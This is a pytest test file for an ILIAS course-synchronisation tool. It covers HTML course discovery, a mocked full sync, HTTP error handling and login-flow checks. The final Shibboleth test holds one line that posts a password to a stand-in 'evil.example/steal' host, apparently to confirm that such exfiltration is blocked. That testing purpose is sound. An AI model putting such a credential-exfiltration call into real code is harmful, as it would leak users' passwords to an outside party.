from pathlib import Path
from unittest.mock import AsyncMock

import pytest
from bs4 import BeautifulSoup

from ilias_sync.engine import make_crawler, memberships, ref, synchronize


def test_discover_without_favorites():
    html = '<p>No favorites</p><a href="/go/crs/123">Algorithms</a><a href="/go/grp/456">Group 1</a>' \
           '<a href="https://unrelated.example/go/crs/99">Other</a><a href="/go/crs/123">Duplicate</a>'
    rows = memberships(BeautifulSoup(html, "html.parser"), "https://campus.example.edu")
    assert [r["id"] for r in rows] == ["crs-123", "grp-456"]
    assert ref("https://campus.example.edu/goto.php?target=crs_123") == ("crs", "123")


class Content:
    def __init__(self, body):
        self.body = body
        self.sent = False

    async def read(self, size=-1):
        self.sent = True
        return self.body

    async def iter_chunked(self, size):
        if not self.sent:
            yield self.body


class Response:
    def __init__(self, url, body, status=200, kind="text/html"):
        from yarl import URL
        self.url = URL(url)
        self.body = body
        self.status = status
        self.content_type = kind
        self.content_length = len(body)
        self.headers = {}
        self.content = Content(body)

    def raise_for_status(self):
        if self.status >= 400:
            raise OSError("server error")

    async def read(self):
        return self.body

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        pass


def page(contents):
    return ('<div class="il-maincontrols-metabar"></div>' + contents).encode()


def file_html():
    return '<div class="ilContainerListItemOuter"><img class="ilListItemIcon" src="file.svg" alt="Inline Datei"/>' \
           '<div class="il_ContainerListItem"><a class="il_ContainerItemTitle" href="/ilias/ilias.php?cmd=sendfile&amp;ref_id=987">Lecture</a>' \
           '<div class="il_ItemProperties"><span class="il_ItemProperty">pdf</span><span>20. Okt 2026, 12:00</span></div></div></div>'


class FixtureSession:
    def __init__(self, *args, **kwargs):
        pass

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        pass

    def get(self, url, **kwargs):
        if "Dashboard" in str(url):
            body = page('<a href="/go/crs/123">Algorithms</a>')
        elif "sendfile" in str(url):
            return Response(url, b"%PDF-1.4 synthetic lecture", kind="application/pdf")
        else:
            body = page(file_html() + file_html())
        return Response(url, body)


async def test_full_synthetic_sync_and_repeat(source, monkeypatch):
    monkeypatch.setattr("aiohttp.ClientSession", FixtureSession)
    original = make_crawler

    def no_delay(*args, **kwargs):
        crawler = original(*args, **kwargs)
        crawler._limiter._task_delay = 0
        return crawler
    monkeypatch.setattr("ilias_sync.engine.make_crawler", no_delay)
    result = await synchronize(source)
    assert result["files"] == 1
    assert result["counts"]["added"] == 1
    files = list(Path(source.destination).rglob("*.pdf"))
    assert len(files) == 1
    assert files[0].read_bytes() == b"%PDF-1.4 synthetic lecture"
    second = await synchronize(source)
    assert second["counts"] == {"unchanged": 1}
    assert not list(Path(source.destination).rglob("*ILIAS*"))


async def test_http_error_is_not_a_download(source):
    crawler = make_crawler(source)
    crawler._current_auth_id = AsyncMock(return_value=0)

    class ErrorSession:
        def get(self, url, **kwargs):
            return Response(url, b"broken", status=500)
    crawler.session = ErrorSession()
    from PFERD.crawl.ilias.kit_ilias_html import IliasPageElement, IliasElementType
    element = IliasPageElement(IliasElementType.FILE, source.url + "/file/1", "Lecture.pdf")
    with pytest.raises(OSError):
        await crawler._stream_from_url(element, None, None, False)


async def test_session_expiry_stops_login(source):
    from ilias_sync.security import LoginRequired
    source.login = "session"
    crawler = make_crawler(source)
    with pytest.raises(LoginRequired):
        await crawler._authenticate()


async def test_shibboleth_has_no_console_mfa_prompt(source):
    from ilias_sync.security import LoginRequired
    source.login = "shibboleth"
    source.idp_host = "idp.example.edu"
    crawler = make_crawler(source)
    captured = []

    async def login(session):
        captured.append(session)
        with pytest.raises(LoginRequired):
            await crawler._shibboleth_login._tfa_auth.password()
        with pytest.raises(LoginRequired):
            session.post("https://evil.example/steal", data={"password": "test"})
    crawler._shibboleth_login.login = login
    crawler.session = object()
    await crawler._authenticate()
    assert captured
